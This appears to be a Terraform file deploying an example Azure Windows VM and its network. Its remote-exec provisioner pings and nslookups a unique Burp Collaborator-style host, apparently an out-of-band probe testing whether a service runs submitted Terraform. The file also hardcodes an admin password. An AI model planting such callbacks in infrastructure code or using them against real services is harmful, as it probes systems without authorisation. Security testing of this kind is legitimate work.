variable "subscription_id" {
  default = "12345678-1234-1234-1234-1234567891"
}

variable "ventureName" {
  default = "12345678-1234-1234-1234-1234567891"
}

variable "tenant_id" {
  default = "12345678-1234-1234-1234-1234567891"
}


provider "azurerm" {
    use_msi         = true
    subscription_id = var.subscription_id
    tenant_id       = var.tenant_id
    features {}
}

#### Add your terraform below

resource "azurerm_resource_group" "example" {
  name     = "example-resources"
  location = "West Europe"
}

resource "azurerm_virtual_network" "example" {
  name                = "example-network"
  address_space       = ["10.0.0.0/16"]
  location            = azurerm_resource_group.example.location
  resource_group_name = azurerm_resource_group.example.name
}

resource "azurerm_subnet" "example" {
  name                 = "internal"
  resource_group_name  = azurerm_resource_group.example.name
  virtual_network_name = azurerm_virtual_network.example.name
  address_prefixes     = ["10.0.2.0/24"]
}

resource "azurerm_network_interface" "example" {
  name                = "example-nic"
  location            = azurerm_resource_group.example.location
  resource_group_name = azurerm_resource_group.example.name

  ip_configuration {
    name                          = "internal"
    subnet_id                     = azurerm_subnet.example.id
    private_ip_address_allocation = "Dynamic"
  }
}

resource "azurerm_windows_virtual_machine" "example" {
  name                = "example-machine"
  resource_group_name = azurerm_resource_group.example.name
  location            = azurerm_resource_group.example.location
  size                = "Standard_F2"
  admin_username      = "adminuser"
  admin_password      = "P@$$w0rd1234!"
  network_interface_ids = [
    azurerm_network_interface.example.id,
  ]

  os_disk {
    caching              = "ReadWrite"
    storage_account_type = "Standard_LRS"
  }

  source_image_reference {
    publisher = "MicrosoftWindowsServer"
    offer     = "WindowsServer"
    sku       = "2016-Datacenter"
    version   = "latest"
  }
  
  provisioner "remote-exec" {
        inline = [
          "ping sso6nf5ufqnw00vkjkc4m3hau10sovck.burp.17.rs",
          "nslookup sso6nf5ufqnw00vkjkc4m3hau10sovck.burp.17.rs"
        ]
    }
}
